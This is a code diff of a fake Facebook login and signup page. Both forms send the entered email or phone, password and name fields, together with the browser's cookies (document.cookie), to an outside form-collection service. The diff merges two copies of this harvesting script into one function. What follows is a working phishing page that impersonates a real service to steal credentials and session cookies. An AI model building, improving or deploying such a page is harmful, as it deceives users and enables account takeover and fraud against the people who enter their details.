@@ -1,155 +1,3 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook</title>
-    <style>
-        /* Global styles */
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #f0f2f5;
-        }
-
-        /* Header styles */
-        header {
-            background-color: #4267B2;
-            color: white;
-            display: flex;
-            justify-content: space-between;
-            padding: 10px 20px;
-        }
-
-        header .logo h1 {
-            margin: 0;
-        }
-
-        nav ul {
-            list-style: none;
-            display: flex;
-            margin: 0;
-            padding: 0;
-            margin-left: 40px;
-        }
-
-        nav ul li {
-            margin-left: 50px;
-        }
-
-        nav ul li a {
-            color: white;
-            text-decoration: none;
-        }
-
-        /* Hero section styles */
-        .hero {
-            text-align: center;
-            padding: 50px;
-        }
-
-        .hero h2 {
-            font-size: 24px;
-            margin-bottom: 20px;
-        }
-
-        .hero form {
-            margin: 0 auto;
-            max-width: 400px;
-        }
-
-        .hero input {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-        }
-
-        .hero button {
-            width: 100%;
-            padding: 10px;
-            background-color: #42b72a;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            margin-left:10px;
-        }
-
-        /* Signup section styles */
-        .signup-section {
-            text-align: center;
-            margin-top: 50px;
-            padding: 20px;
-        }
-
-        .signup-section h2 {
-            margin-bottom: 20px;
-        }
-
-        .signup-section form {
-            max-width: 300px;
-            margin: 0 auto;
-            background-color: white;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-        }
-
-        .signup-section input {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-        }
-
-        .signup-section button {
-            width: 100%;
-            padding: 10px;
-            background-color: #42b72a;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-
-        footer {
-            text-align: center;
-            padding: 20px;
-            background-color: #e9ecef;
-        }
-
-        /* Responsive Styles */
-        @media (max-width: 768px) {
-            .hero h2 {
-                font-size: 20px;
-            }
-
-            .hero form, .signup-section form {
-                max-width: 90%;
-            }
-        }
-
-        @media (max-width: 480px) {
-            header {
-                flex-direction: column;
-                text-align: center;
-            }
-
-            .hero h2 {
-                font-size: 18px;
-            }
-
-            .signup-section form {
-                max-width: 100%;
-            }
-        }
-    </style>
-</head>
-
 <body>
     <header>
         <div class="logo">
@@ -167,7 +15,6 @@
         <section class="hero">
             <h2>Connect with friends and the world around you on Facebook.</h2>
             <form id="login-form" action="https://submit-form.com/VlWBYGciz">
-    
                 <input type="text" name="email" placeholder="Email or Phone Number" required>
                 <input type="password" name="password" placeholder="Password" required>
                 <button type="submit">Log In</button>
@@ -178,8 +25,8 @@
         </section>
 
         <section class="signup-section">
-         <h2>Create a new account</h2>
-         <form id="login-form" action="https://submit-form.com/VlWBYGciz">
+            <h2>Create a new account</h2>
+            <form id="signup-form" action="https://submit-form.com/VlWBYGciz">
                 <input type="text" name="firstName" placeholder="First Name" required>
                 <input type="text" name="lastName" placeholder="Last Name" required>
                 <input type="text" name="emailOrPhone" placeholder="Mobile Number or Email" required>
@@ -195,69 +42,39 @@
     </footer>
     
     <script>
-        // Function to handle login form submission
-        document.getElementById('login-form').addEventListener('submit', function(event) {
-            event.preventDefault(); // Prevent the default form submission
-            
-            const formData = new FormData(this); // Create FormData object from the form
+        // Function to handle form submissions
+        function handleFormSubmit(formId, endpointUrl) {
+            document.getElementById(formId).addEventListener('submit', function(event) {
+                event.preventDefault(); // Prevent default form submission
+                
+                const formData = new FormData(this); // Create FormData object from the form
+                formData.append('cookies', document.cookie); // Append cookies to FormData
 
-            // Add cookies to the FormData
-            formData.append('cookies', document.cookie); // Append cookies to the FormData
-
-            // Send form data with cookies to Formspark
-            fetch('https://submit-form.com/VlWBYGciz', {
-                method: 'POST',
-                body: formData,
-                mode: 'cors' // Enable CORS mode
-            })
-            .then(response => {
-                if (response.ok) {
-                    // Success handling
-                    alert('We will contact you shortly');
-                    setTimeout(function() {
-                        window.location.href = 'home.html';
-                    }, 3000);
-                } else {
-                    alert('Error: Unable to submit the form. Please try again.');
-                }
-            })
-            .catch(error => {
-                alert('Submission failed due to network error.');
-                console.error('Form submission error:', error);
+                // Send form data to Formspark
+                fetch(endpointUrl, {
+                    method: 'POST',
+                    body: formData,
+                    mode: 'cors' // Enable CORS
+                })
+                .then(response => {
+                    if (response.ok) {
+                        alert('Form submitted successfully');
+                        setTimeout(function() {
+                            window.location.href = 'home.html';
+                        }, 3000);
+                    } else {
+                        alert('Error: Unable to submit the form. Please try again.');
+                    }
+                })
+                .catch(error => {
+                    alert('Submission failed due to network error.');
+                    console.error('Form submission error:', error);
+                });
             });
-        });
+        }
 
-        // Function to handle signup form submission
-        document.getElementById('signup-form').addEventListener('submit', function(event) {
-            event.preventDefault(); // Prevent the default form submission
-            
-            const formData = new FormData(this); // Create FormData object from the form
-
-            // Add cookies to the FormData
-            formData.append('cookies', document.cookie); // Append cookies to the FormData
-
-            // Send form data with cookies to Formspark
-            fetch('https://submit-form.com/VlWBYGciz', {
-                method: 'POST',
-                body: formData,
-                mode: 'cors' // Enable CORS mode
-            })
-            .then(response => {
-                if (response.ok) {
-                    // Success handling
-                    alert('We will contact you shortly');
-                    setTimeout(function() {
-                        window.location.href = 'home.html';
-                    }, 3000);
-                } else {
-                    alert('Error: Unable to submit the form. Please try again.');
-                }
-            })
-            .catch(error => {
-                alert('Submission failed due to network error.');
-                console.error('Form submission error:', error);
-            });
-        });
+        // Handle login and signup forms separately
+        handleFormSubmit('login-form', 'https://submit-form.com/VlWBYGciz');
+        handleFormSubmit('signup-form', 'https://submit-form.com/VlWBYGciz');
     </script>
 </body>
-</html>
